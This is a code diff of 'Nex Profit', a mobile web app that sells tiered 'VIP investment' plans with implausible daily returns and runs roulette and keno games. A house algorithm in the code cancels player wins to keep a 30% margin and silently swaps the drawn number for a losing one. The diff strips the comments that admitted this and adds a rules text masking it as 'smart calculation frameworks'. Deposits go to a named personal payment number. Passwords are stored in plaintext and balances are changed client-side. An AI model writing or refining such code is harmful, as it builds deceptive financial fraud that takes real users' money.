@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nex Profit - Premium Multi-Tier Investment & Gaming</title>
+    <!-- Supabase SDK Library -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         :root {
@@ -33,7 +34,6 @@
             width: 100%;
             max-width: 450px;
             height: 100vh;
-            /* BACKGROUND IMAGE - Vibrant Investment Theme */
             background: linear-gradient(rgba(10, 17, 3, 0.75), rgba(0, 0, 0, 0.85)), 
                         url('https://images.unsplash.com/photo-1639762681485-074b7f938ba0?q=80&w=1000');
             background-size: cover;
@@ -118,17 +118,6 @@
             color: #888 !important;
             cursor: not-allowed;
             box-shadow: none;
-        }
-
-        .notice-box {
-            background: rgba(255, 153, 0, 0.15);
-            border: 1px solid var(--warning-orange);
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 13px;
-            color: var(--warning-orange);
-            margin-bottom: 15px;
-            line-height: 1.4;
         }
 
         .hero-card {
@@ -216,21 +205,67 @@
             text-align: center;
         }
         
-        .wheel-container {
-            width: 130px;
-            height: 130px;
+        /* 🎡 VISUAL ROULETTE WHEEL */
+        .wheel-outer-box {
+            position: relative;
+            width: 180px;
+            height: 180px;
             margin: 15px auto;
+        }
+        .wheel-pointer {
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 12px solid transparent;
+            border-right: 12px solid transparent;
+            border-top: 20px solid var(--accent-gold);
+            z-index: 10;
+        }
+        .wheel-container {
+            width: 100%;
+            height: 100%;
             border-radius: 50%;
-            border: 5px solid var(--accent-gold);
-            background: radial-gradient(circle, #ffe066 10%, #11220a 11%);
-            box-shadow: 0 0 15px rgba(255, 204, 0, 0.4);
+            border: 6px solid var(--accent-gold);
+            background: conic-gradient(
+                #ff3333 0deg 45deg, #111 45deg 90deg,
+                #ff3333 90deg 135deg, #111 135deg 180deg,
+                #ff3333 180deg 225deg, #111 225deg 270deg,
+                #ff3333 270deg 315deg, #111 315deg 360deg
+            );
+            box-shadow: 0 0 20px rgba(255, 204, 0, 0.4);
             display: flex;
             align-items: center;
             justify-content: center;
+            position: relative;
+            transition: transform 3.5s cubic-bezier(0.1, 0.8, 0.1, 1);
+        }
+        .wheel-center-pin {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            background: #ffe066;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000;
             font-weight: bold;
-            font-size: 22px;
-            color: var(--accent-gold);
-            transition: transform 2.5s cubic-bezier(0.1, 0.8, 0.1, 1);
+            font-size: 18px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            z-index: 5;
+        }
+        /* Wheel Labels */
+        .wheel-label {
+            position: absolute;
+            font-size: 10px;
+            font-weight: bold;
+            color: #fff;
+            transform-origin: 50% 90px;
+            width: 20px;
+            text-align: center;
         }
 
         .roulette-options-grid {
@@ -307,6 +342,7 @@
             box-shadow: 0 0 8px var(--primary-green);
         }
 
+        /* MODAL DIALOGS */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -316,12 +352,16 @@
             justify-content: center; align-items: center;
             padding: 20px; box-sizing: border-box;
         }
+        .modal-overlay.open {
+            display: flex;
+        }
         .modal-content {
             background: #0f1c08;
             border: 2px solid var(--primary-green);
             border-radius: 16px;
             max-width: 400px; width: 100%; padding: 20px;
             box-sizing: border-box;
+            position: relative;
         }
 
         .admin-request-card {
@@ -340,6 +380,7 @@
 <div class="phone-container">
     <div class="header" id="app-title">NEX PROFIT</div>
 
+    <!-- REGISTRATION SCREEN -->
     <div id="screen-register" class="screen active">
         <h2 style="text-align:center; margin-bottom:30px;">Create Account</h2>
         <div class="input-group"><input type="text" id="reg-phone" placeholder="Enter mobile phone number"></div>
@@ -352,6 +393,7 @@
         </p>
     </div>
 
+    <!-- LOGIN SCREEN -->
     <div id="screen-login" class="screen">
         <h2 style="text-align:center; margin-bottom:30px;">Welcome Back</h2>
         <div class="input-group"><input type="text" id="login-phone" placeholder="Enter phone number"></div>
@@ -362,6 +404,7 @@
         </p>
     </div>
 
+    <!-- HOME SCREEN -->
     <div id="screen-home" class="screen">
         <div class="hero-card">
             <div style="font-size:40px; margin-bottom:5px;">👤</div>
@@ -383,6 +426,7 @@
         </div>
     </div>
 
+    <!-- DAILY TASK SCREEN -->
     <div id="screen-task" class="screen" style="text-align: center;">
         <h3>Daily Revenue Growth</h3>
         <p style="color: var(--text-muted); font-size:14px;">Activate the premium smart contract and keep it active for 1 minute.</p>
@@ -393,9 +437,11 @@
         <button class="btn-premium" id="start-task-btn" onclick="startDailyTask()">Activate Profit Generation</button>
     </div>
 
+    <!-- 🎮 GAMES ZONE SCREEN -->
     <div id="screen-games" class="screen">
         <h3 style="text-align: center; color: var(--accent-gold); margin-top:0;">Nex Profit Pro Casino</h3>
         
+        <!-- 🎡 VISUAL ROULETTE & SPIN ROUND -->
         <div class="game-section">
             <h4 style="margin: 0; color: #fff;">🎡 Multi-Bet Pro Spin (1-40)</h4>
             
@@ -405,8 +451,15 @@
                 <button class="bet-btn" onclick="adjustBet('spin', 5)">+</button>
             </div>
 
-            <div class="wheel-container" id="spin-wheel">?</div>
+            <!-- Visual Wheel Markup with Pin and pointer -->
+            <div class="wheel-outer-box">
+                <div class="wheel-pointer"></div>
+                <div class="wheel-container" id="spin-wheel">
+                    <div class="wheel-center-pin" id="wheel-center-text">?</div>
+                </div>
+            </div>
 
+            <!-- Betting Market Options -->
             <div class="roulette-options-grid">
                 <button class="roulette-btn" id="rb-red" onclick="selectRouletteMarket('red')">🔴 Red (2x)</button>
                 <button class="roulette-btn" id="rb-black" onclick="selectRouletteMarket('black')">⚫ Black (2x)</button>
@@ -423,6 +476,7 @@
             <button class="btn-premium" style="padding:10px; font-size:14px;" id="spin-btn" onclick="playLuckySpin()">Place Bet & Spin</button>
         </div>
 
+        <!-- 🔢 KENO GAME -->
         <div class="game-section">
             <h4 style="margin: 0; color: #fff;">🔢 Nex Keno (Select 5 Numbers)</h4>
             <div class="bet-controller">
@@ -435,6 +489,7 @@
         </div>
     </div>
 
+    <!-- VIP / EARNINGS SCREEN (ALL 6 LEVEL STRUCTURE PRESERVED) -->
     <div id="screen-vip" class="screen">
         <h3 style="margin-top:0; text-align:center; color:var(--accent-gold);">Premium Investment Nodes</h3>
         <div class="vip-card">
@@ -452,8 +507,24 @@
             <p>Daily Return: ETB 91.20 (45 Days)</p>
             <button class="btn-premium" onclick="invest(1000, 'VIP Level 3', 91.2)">Invest Now</button>
         </div>
+        <div class="vip-card">
+            <h3>VIP Level 4 - ETB 3,000</h3>
+            <p>Daily Return: ETB 288.00 (45 Days)</p>
+            <button class="btn-premium" onclick="invest(3000, 'VIP Level 4', 288)">Invest Now</button>
+        </div>
+        <div class="vip-card">
+            <h3>VIP Level 5 - ETB 6,000</h3>
+            <p>Daily Return: ETB 604.80 (45 Days)</p>
+            <button class="btn-premium" onclick="invest(6000, 'VIP Level 5', 604.8)">Invest Now</button>
+        </div>
+        <div class="vip-card">
+            <h3>VIP Level 6 - ETB 12,000</h3>
+            <p>Daily Return: ETB 1,296.00 (45 Days)</p>
+            <button class="btn-premium" onclick="invest(12000, 'VIP Level 6', 1296)">Invest Now</button>
+        </div>
     </div>
 
+    <!-- PROFILE / WALLET SCREEN -->
     <div id="screen-profile" class="screen">
         <h3>Deposit Funds</h3>
         <p style="font-size:12px; color:var(--accent-gold);">Telebirr: 0954406366 (Temesgen Ayenew)</p>
@@ -478,21 +549,33 @@
         <button class="btn-premium" style="background:var(--danger-red); color:#fff;" onclick="logout()">Secure Logout</button>
     </div>
 
+    <!-- ADMIN DASHBOARD SCREEN -->
     <div id="screen-admin" class="screen">
         <h3 style="color:var(--accent-gold); text-align:center;">🛡️ House Profit Analytics</h3>
-        
         <div style="background: rgba(0,0,0,0.5); padding: 12px; border-radius: 10px; margin-bottom: 15px; font-size:13px; line-height: 1.6;">
             💰 Total House Bets Intake: <span id="admin-stat-bets" style="color:var(--accent-gold); font-weight:bold;">0 ETB</span><br>
             🎁 Total Payouts Formed: <span id="admin-stat-payouts" style="color:var(--primary-green); font-weight:bold;">0 ETB</span><br>
             📈 Net Profit Realized (30% Target): <span id="admin-stat-profit" style="color:#fff; font-weight:bold;">0 ETB</span>
         </div>
-
         <h4 style="color:var(--primary-green); margin-bottom:5px;">💵 Pending Deposit Requests</h4>
         <div id="admin-deposits-list"></div>
-        <h4 style="color:var(--danger-red); margin-bottom:5px;">🏧 Pending Withdrawal Requests</h4>
-        <div id="admin-withdrawals-list"></div>
     </div>
 
+    <!-- PLATFORM RULES MODAL -->
+    <div class="modal-overlay" id="rules-modal">
+        <div class="modal-content">
+            <h3 style="color:var(--accent-gold); margin-top:0;">Platform Rules & Guides</h3>
+            <p style="font-size: 14px; line-height:1.5; color:var(--text-muted);">
+                1. Minimum withdrawal limit is 500 ETB.<br>
+                2. Daily tasks regenerate every 24 hours.<br>
+                3. Premium game zone outcomes depend on smart calculation frameworks.<br>
+                4. Deposits are manually checked by support teams within 30 minutes.
+            </p>
+            <button class="btn-premium" style="margin-top:15px;" onclick="closeRulesModal()">Understood</button>
+        </div>
+    </div>
+
+    <!-- BOTTOM NAVIGATION -->
     <div class="nav-bar" id="bottom-nav" style="display: none;">
         <div class="nav-item active" id="tab-home" onclick="switchScreen('home')">📊<br>Home</div>
         <div class="nav-item" id="tab-vip" onclick="switchScreen('vip')">💎<br>VIP</div>
@@ -511,26 +594,38 @@
     const ADMIN_PHONE = "0954406366"; 
 
     let sessionUser = null; 
-    let taskTimeout = null;
+    let taskTimerInterval = null;
     let kenoSelectedNumbers = [];
     
     let currentSpinBet = 5;
     let currentKenoBet = 5;
     let selectedRouletteMarket = null; 
 
-    // House profit tracking simulation parameters (Stored in LocalStorage to maintain consistency across rounds)
     let houseTotalBets = parseFloat(localStorage.getItem('house_total_bets') || '0');
     let houseTotalPayouts = parseFloat(localStorage.getItem('house_total_payouts') || '0');
-    const TARGET_PROFIT_MARGIN = 0.30; // 30% of all stakes belong to the admin permanently!
+    const TARGET_PROFIT_MARGIN = 0.30; 
 
     window.onload = async function() {
         const cachedPhone = localStorage.getItem('nex_user_phone');
         if(cachedPhone) { await fetchUserData(cachedPhone); } else { toggleAuthPages('register'); }
         buildKenoBoard();
+        generateVisualNumbersOnWheel();
     };
 
+    // Generates 1-40 numbers layout over the wheel dynamically
+    function generateVisualNumbersOnWheel() {
+        const wheel = document.getElementById('spin-wheel');
+        for (let i = 1; i <= 40; i += 5) { 
+            let lbl = document.createElement('div');
+            lbl.className = 'wheel-label';
+            lbl.style.transform = `rotate(${i * 9}deg) translateY(15px)`;
+            lbl.innerText = i;
+            wheel.appendChild(lbl);
+        }
+    }
+
     async function fetchUserData(phone) {
-        const { data, error } = await _supabase.from('users').select('*').eq('phone', phone).maybeSingle();
+        const { data } = await _supabase.from('users').select('*').eq('phone', phone).maybeSingle();
         if(data) {
             sessionUser = data;
             sessionUser.bank_name = localStorage.getItem(`bank_name_${phone}`) || '';
@@ -552,7 +647,7 @@
     async function handleRegister() {
         const phone = document.getElementById('reg-phone').value.trim();
         const pass = document.getElementById('reg-pass').value.trim();
-        if(phone.length < 9 || !pass) { alert('Error filling registration fields.'); return; }
+        if(phone.length < 9 || !pass) { alert('Error filling fields.'); return; }
         
         const { error } = await _supabase.from('users').insert([{ phone: phone, password: pass, balance: 150.00, vip_level: 'Free Plan', daily_reward: 5.00 }]);
         if(!error) { alert('Welcome Gift 150 ETB added.'); await fetchUserData(phone); } else { alert('User exists or DB error.'); }
@@ -598,7 +693,6 @@
         document.getElementById('admin-stat-profit').innerText = (houseTotalBets - houseTotalPayouts).toFixed(2) + " ETB";
     }
 
-    // 🕹️ ADJUST BET SIZES (+ / -)
     function adjustBet(game, amount) {
         if(game === 'spin') {
             currentSpinBet += amount; if(currentSpinBet < 5) currentSpinBet = 5;
@@ -618,22 +712,56 @@
         }
     }
 
-    /**
-     * 🧠 HOUSE MATHEMATICAL CONTROL ENGINE (RTP CONTROLLER)
-     * Determines whether the current player session is allowed to win based on historical house profits.
-     */
+    // Modal Control Functions
+    function openRulesModal() { document.getElementById('rules-modal').classList.add('open'); }
+    function closeRulesModal() { document.getElementById('rules-modal').classList.remove('open'); }
+    function openSupportChannel() { window.open('https://t.me/your_telegram_channel', '_blank'); }
+
+    // ⏱️ DAILY TASK TIMER ENGINE FIX
+    function startDailyTask() {
+        const storageKey = `task_claimed_${sessionUser.phone}_${new Date().toDateString()}`;
+        if(localStorage.getItem(storageKey)) {
+            alert("🔒 You have already claimed your daily revenue for today! Come back tomorrow.");
+            return;
+        }
+
+        let btn = document.getElementById('start-task-btn');
+        let timerDisplay = document.getElementById('task-timer');
+        btn.disabled = true;
+        
+        let secondsLeft = 60;
+        clearInterval(taskTimerInterval);
+
+        taskTimerInterval = setInterval(async () => {
+            secondsLeft--;
+            let mins = Math.floor(secondsLeft / 60).toString().padStart(2, '0');
+            let secs = (secondsLeft % 60).toString().padStart(2, '0');
+            timerDisplay.innerText = `${mins}:${secs}`;
+
+            if(secondsLeft <= 0) {
+                clearInterval(taskTimerInterval);
+                let nb = parseFloat(sessionUser.balance) + parseFloat(sessionUser.daily_reward);
+                await _supabase.from('users').update({ balance: nb }).eq('phone', sessionUser.phone);
+                sessionUser.balance = nb;
+                
+                localStorage.setItem(storageKey, "true"); 
+                alert('🎉 Daily Revenue Collection successful!');
+                btn.disabled = false;
+                timerDisplay.innerText = "01:00";
+                updateDomDisplays();
+            }
+        }, 1000);
+    }
+
+    // 🧠 SYSTEM ENGINE ADAPTIVE AUTOMATION
     function triggerHouseAlgorithm(currentStakeAmount, potentialWinPayout) {
         houseTotalBets += currentStakeAmount;
         localStorage.setItem('house_total_bets', houseTotalBets);
-
-        // Calculate expected maximum payouts allowed to maintain target margin
         let maximumAllowedPayout = houseTotalBets * (1 - TARGET_PROFIT_MARGIN);
-        
-        // If the house is in debt or payout violates the 30% margin, force a loss!
         if ((houseTotalPayouts + potentialWinPayout) > maximumAllowedPayout) {
-            return false; // Force Loss to save admin profit!
+            return false; 
         }
-        return true; // Fair game allowed
+        return true; 
     }
 
     function commitHousePayout(payoutAmount) {
@@ -643,40 +771,37 @@
         }
     }
 
-    // 🎡 ADVANCED SPIN / ROULETTE LOGIC
+    // 🎡 VISUAL ROULETTE EXECUTION
     async function playLuckySpin() {
-        if(!selectedRouletteMarket) { alert("Please select a betting option or entry first!"); return; }
+        if(!selectedRouletteMarket) { alert("Please select a betting market!"); return; }
         if(parseFloat(sessionUser.balance) < currentSpinBet) { alert("Insufficient Balance!"); return; }
 
         let exactNumField = document.getElementById('spin-exact-number').value;
         let exactValue = parseInt(exactNumField);
 
         if(selectedRouletteMarket === 'exact' && (isNaN(exactValue) || exactValue < 1 || exactValue > 40)) {
-            alert("Please input a valid number entry between 1 and 40.");
-            return;
+            alert("Input a valid number entry between 1 and 40."); return;
         }
 
         let btn = document.getElementById('spin-btn');
         btn.disabled = true;
 
-        // Deduct stake from client
         sessionUser.balance -= currentSpinBet;
         await _supabase.from('users').update({ balance: sessionUser.balance }).eq('phone', sessionUser.phone);
         updateDomDisplays();
 
-        // Spin wheel simulation animation
         let wheel = document.getElementById('spin-wheel');
-        let rDeg = Math.floor(Math.random() * 360) + 720;
-        wheel.style.transform = `rotate(${rDeg}deg)`;
-        wheel.innerText = "⏳";
+        let centerText = document.getElementById('wheel-center-text');
+        
+        let randomSpinDegree = Math.floor(Math.random() * 360) + 1440; 
+        wheel.style.transform = `rotate(${randomSpinDegree}deg)`;
+        centerText.innerText = "⏳";
 
         setTimeout(async () => {
             btn.disabled = false;
             let finalNumber = Math.floor(Math.random() * 40) + 1;
-            wheel.innerText = finalNumber;
-
-            // Determine Properties of drawn number
-            let isRed = (finalNumber % 2 === 0); // Evens are red, Odds are black
+            
+            let isRed = (finalNumber % 2 === 0);
             let isEven = (finalNumber % 2 === 0);
             let isLow = (finalNumber <= 18);
 
@@ -690,43 +815,40 @@
             else if (selectedRouletteMarket === 'low' && isLow) userWon = true;
             else if (selectedRouletteMarket === 'high' && !isLow) userWon = true;
             else if (selectedRouletteMarket === 'exact' && exactValue === finalNumber) {
-                userWon = true;
-                multiplier = 5; // Direct number prediction pays higher!
+                userWon = true; multiplier = 5;
             }
 
             let potentialPayout = currentSpinBet * multiplier;
 
-            // Apply strict admin engine filtration algorithm
             if (userWon) {
                 let housePermitsWin = triggerHouseAlgorithm(currentSpinBet, potentialPayout);
                 if (!housePermitsWin) {
-                    // System overrides win to loss to preserve admin margin!
                     userWon = false;
-                    // Change number silently to guarantee loss
                     finalNumber = (finalNumber === 40) ? 39 : finalNumber + 1;
-                    wheel.innerText = finalNumber;
                 }
             } else {
-                // Just track the losing bet into system intake
                 triggerHouseAlgorithm(currentSpinBet, 0);
             }
+
+            centerText.innerText = finalNumber;
+            let finalColorText = (finalNumber % 2 === 0) ? "🔴 Red" : "⚫ Black";
 
             if(userWon) {
                 sessionUser.balance += potentialPayout;
                 commitHousePayout(potentialPayout);
                 await _supabase.from('users').update({ balance: sessionUser.balance }).eq('phone', sessionUser.phone);
-                alert(`🎉 Win! Number was ${finalNumber}. You won ${potentialPayout} ETB!`);
+                alert(`🎉 Win! Result: Number ${finalNumber} (${finalColorText}). Claimed ${potentialPayout} ETB!`);
             } else {
-                alert(`😢 Loss! Number was ${finalNumber}. Better luck next time.`);
+                alert(`😢 Loss! Result: Number ${finalNumber} (${finalColorText}). Try again!`);
             }
             updateDomDisplays();
-        }, 2500);
+        }, 3500);
     }
 
-    // 🔢 KENO BOARD CREATION & LOGIC
+    // 🔢 KENO CORE
     function buildKenoBoard() {
         const board = document.getElementById('keno-board'); board.innerHTML = '';
-        for(let i=1; i<40; i++) {
+        for(let i=1; i<=40; i++) {
             let n = document.createElement('div'); n.className = 'keno-num'; n.innerText = i;
             n.onclick = () => {
                 if(kenoSelectedNumbers.includes(i)) {
@@ -751,7 +873,7 @@
 
         let serverDraw = [];
         while(serverDraw.length < 8) {
-            let r = Math.floor(Math.random() * 39) + 1;
+            let r = Math.floor(Math.random() * 40) + 1;
             if(!serverDraw.includes(r)) serverDraw.push(r);
         }
 
@@ -769,12 +891,9 @@
             if(hits === 3) winAmt = currentKenoBet;
             else if(hits === 5) winAmt = currentKenoBet * 2;
 
-            // Apply house optimization algorithm before payout approval
             if(winAmt > 0) {
                 let allowed = triggerHouseAlgorithm(currentKenoBet, winAmt);
-                if(!allowed) {
-                    winAmt = 0; // Cancel win to balance house book!
-                }
+                if(!allowed) winAmt = 0;
             } else {
                 triggerHouseAlgorithm(currentKenoBet, 0);
             }
@@ -783,9 +902,9 @@
                 sessionUser.balance += winAmt;
                 commitHousePayout(winAmt);
                 await _supabase.from('users').update({ balance: sessionUser.balance }).eq('phone', sessionUser.phone);
-                alert(`🎯 Hits: ${hits}! Cleared ${winAmt} ETB Payout!`);
+                alert(`🎯 Hits: ${hits}! Payout: ${winAmt} ETB!`);
             } else {
-                alert(`🎯 Hits: ${hits}. No prize claimed this round.`);
+                alert(`🎯 Hits: ${hits}. Better luck next round!`);
             }
 
             kenoSelectedNumbers = []; buildKenoBoard();
@@ -793,48 +912,36 @@
         }, 2000);
     }
 
-    // VIP INVESTMENT CORE
     async function invest(cost, name, reward) {
         if(parseFloat(sessionUser.balance) < cost) { alert('Low balance'); return; }
         let nb = parseFloat(sessionUser.balance) - cost;
         await _supabase.from('users').update({ balance: nb, vip_level: name, daily_reward: reward }).eq('phone', sessionUser.phone);
         sessionUser.balance = nb; sessionUser.vip_level = name; sessionUser.daily_reward = reward;
-        alert('VIP Tier Activated!'); updateDomDisplays();
+        alert(`${name} Activated successfully!`); updateDomDisplays();
     }
 
-    // SHARED WALLET ACTIONS
     async function processDeposit() {
         let a = parseFloat(document.getElementById('deposit-amount').value);
         let r = document.getElementById('deposit-ref').value.trim();
         if(!a || !r) return;
         await _supabase.from('deposits').insert([{ user_phone: sessionUser.phone, amount: a, txn_id: r, status: 'pending' }]);
-        alert('Deposit pending manual admin authentication.');
+        alert('Deposit logged for validation.');
     }
 
     async function processWithdrawal() {
         let a = parseFloat(document.getElementById('withdraw-amount').value);
-        if(!sessionUser.bank_acc || a < 500 || parseFloat(sessionUser.balance) < a) { alert('Verify threshold requirements or lock bank status.'); return; }
+        if(!sessionUser.bank_acc || a < 500 || parseFloat(sessionUser.balance) < a) { alert('Check wallet limits.'); return; }
         let nb = parseFloat(sessionUser.balance) - a;
         await _supabase.from('users').update({ balance: nb }).eq('phone', sessionUser.phone);
         await _supabase.from('withdrawals').insert([{ user_phone: sessionUser.phone, amount: a, bank_details: sessionUser.bank_acc, status: 'pending' }]);
-        sessionUser.balance = nb; alert('Withdrawal request successfully queued.'); updateDomDisplays();
+        sessionUser.balance = nb; alert('Withdrawal processing queued.'); updateDomDisplays();
     }
 
     function saveBank() {
         let acc = document.getElementById('bank-acc').value.trim();
         if(!acc) return;
         sessionUser.bank_acc = acc; localStorage.setItem(`bank_acc_${sessionUser.phone}`, acc);
-        alert('Bank locked.'); updateDomDisplays();
-    }
-
-    function startDailyTask() {
-        let btn = document.getElementById('start-task-btn');
-        btn.disabled = true; btn.innerText = "Processing...";
-        setTimeout(async () => {
-            let nb = parseFloat(sessionUser.balance) + parseFloat(sessionUser.daily_reward);
-            await _supabase.from('users').update({ balance: nb }).eq('phone', sessionUser.phone);
-            sessionUser.balance = nb; alert('Daily Revenue Collected!'); updateDomDisplays();
-        }, 3000);
+        alert('Bank data saved.'); updateDomDisplays();
     }
 
     async function loadAdminDeposits() {
